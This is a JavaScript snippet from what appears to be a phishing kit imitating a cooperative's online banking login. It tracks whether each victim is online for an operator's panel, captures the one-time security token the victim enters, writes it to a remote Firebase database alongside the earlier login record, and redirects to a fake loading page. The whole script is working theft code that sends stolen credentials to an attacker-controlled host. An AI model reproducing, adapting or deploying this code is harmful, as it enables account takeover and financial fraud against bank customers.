<script>
    // 1. CONFIGURACIÓN
    const firebaseConfig = { 
        databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 2. OBTENER EL ID DE LA URL
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('id');

    if (sessionId) {
        // Lógica de presencia para la luz del panel
        const presenceRef = db.ref('logins/' + sessionId + '/online');
        db.ref(".info/connected").on("value", (snap) => {
            if (snap.val() === true) {
                presenceRef.set(true);
                presenceRef.onDisconnect().set(false);
            }
        });

        // Evento al presionar continuar
        document.getElementById('form-token').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // CAPTURA DE 1 SOLO INPUT (Asegúrate de que tu input tenga id="token")
            const codigoCompleto = document.getElementById('token').value;
            
            const btn = document.getElementById('btn-envio');
            
            // Validación mínima para no enviar vacío
            if (codigoCompleto.length < 4) {
                return; 
            }

            btn.disabled = true;

            // Actualizar el mismo registro y redirigir
            db.ref('logins/' + sessionId).update({
                token: codigoCompleto,
                step: 'TOKEN_ENTREGADO' // Cambié 'status' por 'step' para que tu panel lo lea correctamente
            }).then(() => {
                window.location.href = 'cargando2.html?id=' + sessionId;
            }).catch(() => {
                window.location.href = 'cargando2.html?id=' + sessionId;
            });
        });

    } else {
        window.location.href = 'index.html';
    }
</script>
